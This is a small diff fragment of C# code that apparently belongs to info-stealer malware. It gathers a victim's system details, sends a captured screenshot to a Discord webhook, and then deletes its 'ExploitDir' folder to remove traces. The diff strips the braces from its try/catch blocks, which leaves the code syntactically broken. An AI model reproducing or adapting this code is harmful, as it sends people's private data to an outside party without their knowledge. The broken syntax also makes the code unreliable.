@@ -48,20 +48,14 @@ namespace Checker
                      "\n PhysicalMemory: " + SystemInfo.GetPhysicalMemory() +
                      "\n GPU: " + SystemInfo.GetGPU();   
                         try
-                        {
                             DiscordWebhook.SendFile(mssgBody, "Check.png", "png", Help.ExploitDir + "\\Screen.png", "");
-                        }
                         catch
-                        {
                             DiscordWebhook.Send("Скриншот много весит, не удалось отправить...");
-                        }
                         Thread.Sleep(50000);
                         Directory.Delete(Help.ExploitDir + "\\", true);
                     }
                     catch (Exception e)
-                    {
                         Console.WriteLine(e);
-                    }
                 }
             }
         } 
